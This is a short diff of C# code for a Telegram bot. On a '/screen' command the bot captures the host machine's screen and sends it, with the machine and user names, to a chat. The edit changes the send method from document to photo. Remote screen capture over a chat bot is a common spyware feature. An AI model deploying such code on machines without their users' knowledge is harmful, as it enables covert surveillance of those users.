@@ -42,7 +42,7 @@ namespace telegrambot
             {
                 case "/screen":
                     var fileToSend = new FileToSend("screenshot.jpeg", getScreenshot());
-                    bot.SendDocument(message.Chat.Id, fileToSend, Environment.MachineName + " " + Environment.UserName);
+                    bot.SendPhoto(message.Chat.Id, fileToSend, Environment.MachineName + " " + Environment.UserName);
                     break;
                 default:
                     break;
